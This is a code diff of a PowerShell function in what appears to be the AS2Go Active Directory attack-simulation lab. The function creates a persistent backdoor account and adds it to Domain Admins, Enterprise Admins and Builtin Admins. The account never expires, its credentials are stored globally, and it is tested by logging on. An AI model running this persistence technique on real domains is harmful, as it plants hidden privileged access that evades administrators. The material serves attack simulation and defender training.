@@ -1,31 +1,60 @@
 <#
 .SYNOPSIS
-Creates a backdoor account for the AS2Go Active Directory lab.
+Creates a persistent backdoor user account with elevated group memberships.
 
 .DESCRIPTION
-Creates and enables an account, attempts to assign privileged group memberships, and checks account sign-in.
+Establishes persistent domain access by creating an administrative backdoor user account with elevated
+group memberships (Domain Admins, Enterprise Admins, and Builtin Admins). The account is configured to
+never expire and stores its credentials globally for later use. Handles missing or invalid BDUsersOU
+configuration by falling back to the Users container automatically. Validates successful account
+creation by testing logon and displaying group memberships.
+
+.EXAMPLE
+Invoke-BackdoorUserCreation
+Runs the backdoor account creation workflow using the initialized AS2Go module configuration.
+
+.INPUTS
+None. This function does not declare pipeline input.
+
+.OUTPUTS
+Console messages and output from invoked commands; no dedicated result object is defined.
+Global variables $global:BDUser, $global:BDSecurePass, $global:BDCred, and $global:BDCredUPN are set.
+
+.NOTES
+Private AS2Go function. Run from an initialized AS2Go module session.
+Requires Domain Admin privileges and initialized module configuration (GroupDA, GroupDNSA, GroupEA).
+If BDUsersOU is not configured or does not exist, automatically uses the Users container and updates config.
 
 .COMPONENT
 Category: Main Function
 
 .FUNCTIONALITY
-Creates an enabled backdoor account with a non-expiring password and attempts privileged group assignments.
-Demonstrates persistence through administrative access; displays credentials and tests group membership and sign-in.
-Attempts to open PowerShell as the new account.
+Creates a persistent backdoor user with elevated group memberships across the entire forest.
+Automatically handles missing or invalid target OUs by falling back to the Users container.
+Tests logon and displays group memberships to verify successful creation.
 #>
-function New-BackDoorUser {
+function Invoke-BackdoorUserCreation {
+
+    $info = Measure-FunctionRuntime -Begin
+
+    If (-not $SkipClearHost) { Clear-Host }
     
-    ################################################################################
-    #####                                                                      ##### 
-    #####    Create a new back door user and add them to priviledge groups     #####                                
-    #####                                                                      #####
-    ################################################################################
-
-    $Info = Measure-FunctionRuntime -Begin
-
-    Write-AS2GoOutput -Type Header -Message "New-BackDoorUser"
+    Write-AS2GoOutput -Type Header -M "Create a backdoor account with elevated group memberships for persistence"
     Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)
     Show-CurrentPhase -Phase  "https://cymulate.com/cybersecurity-glossary"   
+    
+    If ($UnAttended) {
+        $answer = $Script:Yes
+    }
+    else {
+        $answer = Show-DecisionPrompt
+    }
+
+    If ($answer -ne $Script:Yes) {
+        return
+    }
+
+
 
     $FirstName = Get-Date -Format HHmmss
     $LastName = Get-Date -Format yyyyMMdd
@@ -43,6 +72,30 @@ function New-BackDoorUser {
     $BDUserPW = Get-RandomPassword
     $global:BDSecurePass = ConvertTo-SecureString -String $BDUserPW -AsPlainText -Force
     $global:BDUser = $samaccountname
+
+    if ([string]::IsNullOrEmpty($TargetOU)) {
+        Write-AS2GoOutput -Type Warning -Message "BDUsersOU not configured. Attempting to use Users container."
+        $result = Convert-FromDNToCN -DistinguishedName $TargetOU
+        $fqdn = $result.Split('/')[0]
+        $UsersContainer = "CN=Users,$(([ADSI]"LDAP://RootDSE").defaultNamingContext)"
+        $TargetOU = $UsersContainer
+        Set-ASConfig -Setting "BDUsersOU" -Value $TargetOU
+        Write-AS2GoOutput -Type Info -Message "Using Users container: $TargetOU"
+    }
+    else {
+        try {
+            $ouTest = Get-ADObject -Identity $TargetOU -ErrorAction Stop | Select-Object -ExpandProperty DistinguishedName
+        }
+        catch {
+            Write-AS2GoOutput -Type Warning -Message "Configured BDUsersOU does not exist: $TargetOU. Attempting to use Users container."
+            $result = Convert-FromDNToCN -DistinguishedName $TargetOU
+            $fqdn = $result.Split('/')[0]
+            $UsersContainer = "CN=Users,$(([ADSI]"LDAP://RootDSE").defaultNamingContext)"
+            $TargetOU = $UsersContainer
+            Set-ASConfig -Setting "BDUsersOU" -Value $TargetOU
+            Write-AS2GoOutput -Type Info -Message "Using Users container: $TargetOU"
+        }
+    }
 
     $result = Convert-FromDNToCN -DistinguishedName $TargetOU
     $fqdn = $result.Split('/')[0]
@@ -185,7 +238,8 @@ function New-BackDoorUser {
 
     $global:BDCredUPN = New-Object System.Management.Automation.PSCredential $UPN, $global:BDSecurePass
     $global:BDCred = New-Object System.Management.Automation.PSCredential $user, $global:BDSecurePass
-    Start-Process pwsh -Credential $global:BDCred -ArgumentList "-NoExit", "-Command", "whoami /groups"
+    
+    Start-Process pwsh -Credential $global:BDCred -ArgumentList "-NoExit", "-Command", "whoami" -WorkingDirectory $env:SystemRoot
 
     if (Test-ADLogon -Credential $global:BDCred -DomainController $Script:ASDC -Domain $fqdn) {
         Write-AS2GoOutput -Type Success -Message "Test logon for backdoor account '$UPN' succeeded."
